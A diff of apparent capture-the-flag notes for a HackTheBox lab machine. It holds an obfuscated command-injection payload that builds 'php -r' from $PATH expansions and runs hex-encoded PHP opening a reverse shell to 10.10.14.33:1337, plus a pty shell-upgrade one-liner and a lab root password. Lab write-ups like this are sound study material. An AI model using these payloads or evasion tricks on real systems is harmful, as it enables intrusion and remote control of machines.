@@ -155,11 +155,11 @@ reverse tunnel
   O - aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e282231302e31302e31342e3333222c31333337293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));' 
   O - python -c 'import pty; pty.spawn("/bin/bash")'
   X - Can use sudo?
-
-  # Set web admin interface password
-  /usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'
-  # Set admin email
-  /usr/local/bin/pihole -a email admin@unbalanced.htb
-  pihole.unbalanced.htb
-  su root with the pass
-    - bUbBl3gUm$43v3Ry0n3!
+  O - found these creds in a file in /root (www-data can go into /root):
+    # Set web admin interface password
+    /usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'
+    # Set admin email
+    /usr/local/bin/pihole -a email admin@unbalanced.htb
+    pihole.unbalanced.htb
+    su root with the pass
+      - bUbBl3gUm$43v3Ry0n3!
